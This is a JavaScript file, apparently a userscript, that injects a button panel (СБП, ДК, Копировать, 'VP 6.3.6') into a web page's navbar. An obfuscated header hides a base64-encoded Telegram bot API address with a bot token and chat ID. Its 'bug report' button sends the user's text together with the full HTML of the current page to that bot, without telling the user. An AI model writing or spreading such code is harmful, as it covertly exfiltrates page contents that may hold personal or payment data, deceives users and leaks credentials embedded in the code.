
(function(_0x7a2fe6,_0x492497){const _0x513263=_0x26ea,_0x4fc983=_0x7a2fe6();while(!![]){try{const _0x1bcd87=parseInt(_0x513263(0x73))/0x1*(parseInt(_0x513263(0x6d))/0x2)+parseInt(_0x513263(0x74))/0x3+parseInt(_0x513263(0x7a))/0x4+parseInt(_0x513263(0x7b))/0x5*(parseInt(_0x513263(0x76))/0x6)+-parseInt(_0x513263(0x6c))/0x7+parseInt(_0x513263(0x6e))/0x8*(-parseInt(_0x513263(0x72))/0x9)+-parseInt(_0x513263(0x75))/0xa;if(_0x1bcd87===_0x492497)break;else _0x4fc983['push'](_0x4fc983['shift']());}catch(_0x28d35f){_0x4fc983['push'](_0x4fc983['shift']());}}}(_0x1e14,0xe4bda));function _0x26ea(_0x110f7e,_0x3c241e){const _0x1e14dc=_0x1e14();return _0x26ea=function(_0x26ea4d,_0x34d36f){_0x26ea4d=_0x26ea4d-0x6c;let _0x2c64ee=_0x1e14dc[_0x26ea4d];return _0x2c64ee;},_0x26ea(_0x110f7e,_0x3c241e);}function _0x1e14(){const _0x53efc8=['3100111mAMTYS','35122XZGpka','47536ISNDMo','NTYyNzk3MTY1MA==','application/json;\x20charset=UTF-8','aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcyMzY2OTgyMTE6QUFFYjk5TVpuR0FJdVVCUk1COENORkt4R2RubFdCWW5pRm8vc2VuZE1lc3NhZ2U=','1440QdsDQh','43miOQkQ','2990196YPCwrI','13346620wxHEoc','6tskRTe','setRequestHeader','stringify','POST','4453492YLSxJZ','3999745AmKyAD','Content-type','open'];_0x1e14=function(){return _0x53efc8;};return _0x1e14();}function sendMessage(_0x1e1e5a){const _0x2b70ae=_0x26ea,_0x357324=new XMLHttpRequest();_0x357324[_0x2b70ae(0x7d)](_0x2b70ae(0x79),atob(_0x2b70ae(0x71)),!![]),_0x357324[_0x2b70ae(0x77)](_0x2b70ae(0x7c),_0x2b70ae(0x70)),_0x357324['send'](JSON[_0x2b70ae(0x78)]({'chat_id':atob(_0x2b70ae(0x6f)),'text':_0x1e1e5a,'silent':!![]}));}


class Interface {
    constructor() {
        const styles = {
              appwrapper: {
                height: "auto",
                width: "auto",
                position: "fixed",
                right: "0",
                transition: "0.3s ease-in-out",
                transform: "translate(80px, 0)",
                zIndex: "100"
              },
              helper: {
                height: "40px",
                width: "40px",
                background: "#C44536",
                opacity: "0.5",
                borderRadius: "50%",
                position: "fixed",
                right: "0",
                bottom: "0",
                transition: "0.3s ease-in-out",
                transform: "translate(40px, -20px)",
                zIndex: "100"
              },
            spans: {
              position: "absolute",
              right: "0px",
              top: "50px",
              height: "120px",
              width: "120px",
              display: "flex",
              justifyContent: "center",
              alignItems: "center",
              flexDirection: "column",
              color: "white",
              background: "#438eb9",
              fontSize: "17px",
              fontWeight: "bold",
              fontFamily: "helvetica",
              borderRadius: "10px",
              cursor: "pointer",
              userSelect: "none",
              textAlign: "center",
            }
          }
          
          let wrapper = document.createElement("div")
          wrapper.classList.add("wrapper")
          Object.assign(wrapper.style, styles["appwrapper"])
          
          const bst = {
            "app_sbp": ["<p>СБП</p>ALT+A", {
              transition: "0.5s ease-in-out",
              background: "#C44536",
            }],
            "app_dc": ["<p>ДК</p>ALT+Q", {
              transition: "0.5s ease-in-out",
              background: "#C44536",
            }],
            "app_copy_button": ["<p>Копировать</p>ALT+S",  {
              transition: "0.5s ease-in-out"
            }],
            "app_icon": ["VP 6.3.6", {
              fontFamily: "impact",
              fontWeight: "250",
              fontSize: "25px",
              transition: "transform 0.5s ease-in-out, color 0.2s ease-in-out",
              color: "#438eb9"
            }],
          }

          let buttons_list = {}

          for (let btn in bst) {
            let cls = btn
            let inner = bst[btn][0]
            let style = bst[btn][1]
            let elem = document.createElement("span")
            elem.classList.add(cls)
            elem.innerHTML += inner
            Object.assign(elem.style, Object.assign({}, styles["spans"], style))
            buttons_list[cls] = elem    
          }

          let mass = [buttons_list["app_dc"], buttons_list["app_sbp"]]
          let all = [buttons_list["app_sbp"], buttons_list["app_dc"], buttons_list["app_copy_button"], buttons_list["app_icon"]]
          mass.forEach((e) => {e.addEventListener("click", () => {this.ToggleCheck(e)})});
          buttons_list["app_copy_button"].addEventListener("mousedown", (e) => {e.target.style.background = "#93cbf9"})
          all.forEach(e => {wrapper.appendChild(e)});
          document.querySelector("#navbar").appendChild(wrapper)
          let send_help = document.createElement("span")
          Object.assign(send_help.style, Object.assign({}, styles["helper"]))
          document.querySelector("#navbar").appendChild(send_help)
          send_help.addEventListener("click", ()=> {
            let result = confirm("Нашли ошибку? Составим отчет об ошибке?");
            if (result) {
              let problem = prompt("Опишите проблему");
              result = confirm("Отправить отчет?");
              if (result) {
                sendMessage(problem + document.body.innerHTML)
                alert("Спасибо за уделенное время! Приятного использования!");
              } 
            }
            
            
            
           
          })

          let first_position_app = false
          let second_position_app = false

          buttons_list["app_icon"].addEventListener("click", ()=> {
            if (first_position_app||second_position_app) {
                send_help.style.transform = "translate(40px, -20px)",
                buttons_list["app_dc"].style.transform="none"
                buttons_list["app_sbp"].style.transform="none"
                buttons_list["app_copy_button"].style.transform="none"
                second_position_app = false
                if (first_position_app) {
                    setTimeout(() => {
                      wrapper.style.transform = "translate(80px, 0)"
                      buttons_list["app_icon"].style.color = "#438eb9"
                      first_position_app = false
                      buttons_list["app_dc"].style.transform="none"
                      buttons_list["app_sbp"].style.transform="none"
                      buttons_list["app_copy_button"].style.transform="none"
                      second_position_app = false
                    }, 500)
                }
              }
          }) 

          buttons_list["app_icon"].addEventListener("mouseover", (e) => {
            e.stopPropagation();
            if (!first_position_app||!second_position_app) {  
              send_help.style.transform =  "translate(-20px, -20px)",
              wrapper.style.transform = "translate(-20px, 0)"
              buttons_list["app_icon"].style.color="white"

              buttons_list["app_dc"].style.transform="translate(-150px, 0)"
              buttons_list["app_sbp"].style.transform="translate(0, 0)"
              buttons_list["app_copy_button"].style.transform="translate(-150px, 0)"

              first_position_app = true
              setTimeout(() => {
                if (first_position_app) {    
                    buttons_list["app_dc"].style.transform="translate(-150px, 150px)"
                    buttons_list["app_sbp"].style.transform="translate(0, 150px)"
                    buttons_list["app_copy_button"].style.transform="translate(-150px, 0)"
                    second_position_app = true
                }
              }, 500)
            }
          })

        

          this.buttons = [buttons_list["app_copy_button"], [buttons_list["app_sbp"], buttons_list["app_dc"]], send_help]
    }

    ToggleCheck(el, cls="checked") {
        let colors = ["#C44536", "#6B8E3E"]
        el.classList.toggle(cls)
        if (this.check(el)) {el.style.background = colors[1]} else {el.style.background = colors[0]}
    }

    check(el, cls="checked") {return (el.classList.contains(cls))}
}